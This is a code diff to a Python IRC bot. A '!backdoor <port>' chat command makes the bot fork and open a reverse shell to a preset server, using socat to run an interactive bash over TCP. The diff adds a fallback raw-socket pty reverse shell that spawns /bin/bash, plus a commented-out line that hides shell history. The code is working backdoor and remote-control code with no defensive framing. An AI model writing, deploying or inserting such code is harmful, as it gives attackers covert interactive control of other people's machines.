@@ -3,17 +3,43 @@
 from rocksock import Rocksock, RocksockException
 from irc import RsIRC
 
-def backdoor(server, port):
+def print_exception(irc, channel, lines):
+	for line in lines.splitlines():
+		irc.privmsg(channel, line)
+
+def dumb_backdoor(irc, channel, server, port):
+	import pty, socket, os
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	try:
+		s.connect((server, port))
+		os.dup2(s.fileno(),0)
+		os.dup2(s.fileno(),1)
+		os.dup2(s.fileno(),2)
+		#os.putenv("HISTFILE",'/dev/null')
+		pty.spawn("/bin/bash")
+	except Exception as e:
+		import traceback
+		print_exception(irc, channel, traceback.format_exc())
+
+def backdoor(irc, channel, server, port):
 	import os
 	import shlex
+	import traceback
+
 	pid = os.fork()
 	if pid == 0: #child
-		#import pty
-		#pty.spawn("/bin/bash")'
 		cmd = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%d"%(server, port)
-		#cmdarr = shlex.split(cmd)
-		os.execlp('/bin/sh', '/bin/sh', '-c', cmd)
-
+		cmdarr = shlex.split(cmd)
+		try:
+			os.execvp('socat', cmdarr)
+			#os.execlp('/bin/sh', '/bin/sh', '-c', cmd)
+		except OSError as e:
+			if e.errno == os.errno.ENOENT:
+				dumb_backdoor(irc, channel, server, port)
+			else:
+				print_exception(irc, channel, traceback.format_exc())
+		# catch child process on exception/after dumb shell
+		os.execlp("/bin/true", "/bin/true")
 
 if __name__ == '__main__':
 	import time
@@ -53,7 +79,7 @@ if __name__ == '__main__':
 				d = d.lstrip(':')
 				words = d.split(' ')
 				if words[0] == '!backdoor':
-					backdoor(backdoorserver, int(words[1]))
+					backdoor(irc, channel, backdoorserver, int(words[1]))
 					try:
 						pass
 					except:
